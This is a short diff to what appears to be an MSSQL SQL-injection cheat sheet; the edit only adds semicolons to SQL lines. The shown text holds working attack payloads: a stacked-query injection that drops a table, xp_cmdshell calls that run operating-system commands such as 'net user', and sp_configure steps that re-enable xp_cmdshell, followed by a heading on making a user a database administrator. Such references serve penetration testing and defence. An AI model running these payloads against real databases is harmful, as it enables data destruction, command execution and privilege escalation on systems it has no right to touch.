@@ -124,17 +124,17 @@ ProductID=1; DROP members--
 
 ```sql
 EXEC xp_cmdshell "net user";
-EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'
-EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1'
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
 ```
 
 If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
 
 ```sql
-EXEC sp_configure 'show advanced options',1
-RECONFIGURE
-EXEC sp_configure 'xp_cmdshell',1
-RECONFIGURE
+EXEC sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
 ```
 
 ## MSSQL Make user DBA (DB admin)
